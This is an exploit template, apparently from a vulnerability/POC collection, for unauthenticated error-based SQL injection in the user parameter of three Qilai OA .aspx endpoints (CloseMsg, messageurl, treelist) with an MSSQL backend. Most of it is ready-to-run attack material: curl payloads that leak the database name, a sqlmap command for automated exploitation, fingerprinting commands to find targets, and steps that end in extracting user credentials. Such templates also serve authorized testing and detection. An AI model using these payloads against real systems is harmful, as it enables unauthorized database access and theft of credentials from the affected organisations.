---
id: QILAI-SQLI
title: 启莱OA 多接口 SQL注入漏洞
product: qilai-oa
vendor: 启莱OA
version_affected: "all versions"
severity: HIGH
tags: [sqli, 无需认证, 国产, oa]
fingerprint: ["启莱OA"]
---

## 漏洞描述

启莱OA 的多个 .aspx 接口（CloseMsg.aspx、messageurl.aspx、treelist.aspx）存在 SQL 注入漏洞，user 参数未经过滤直接拼接进 SQL 语句，攻击者无需认证即可通过报错注入获取数据库名、表名及敏感数据。后端数据库为 MSSQL。

## 影响版本

- 启莱OA（所有已知版本）

## 前置条件

- 无需认证
- 目标运行启莱OA
- 后端数据库为 MSSQL

## 利用步骤

1. 确认目标为启莱OA
2. 在 user 参数中注入 SQL 语句
3. 利用报错注入获取数据库信息
4. 提取用户凭据等敏感数据

## Payload

**报错注入获取数据库名**

```bash
# CloseMsg.aspx
curl -s "http://target/client/CloseMsg.aspx?user='%20and%20(select%20db_name())>0--&pwd=1"

# messageurl.aspx
curl -s "http://target/client/messageurl.aspx?user='%20and%20(select%20db_name())>0--&pwd=1"

# treelist.aspx
curl -s "http://target/client/treelist.aspx?user='%20and%20(select%20db_name())>0--"
```

**SQLmap 自动化利用**

```bash
sqlmap -u "http://target/client/CloseMsg.aspx?user=1&pwd=1" -p user --batch --dbms=mssql
```

## 验证方法

```bash
# 触发报错注入 — 响应中包含数据库名
curl -s "http://target/client/CloseMsg.aspx?user='%20and%20(select%20db_name())>0--&pwd=1" | grep -i "nvarchar\|db_name\|数据库"
```

## 指纹确认

```bash
curl -s "http://target/" | grep -i "启莱"
curl -s "http://target/client/" -o /dev/null -w "%{http_code}"
```
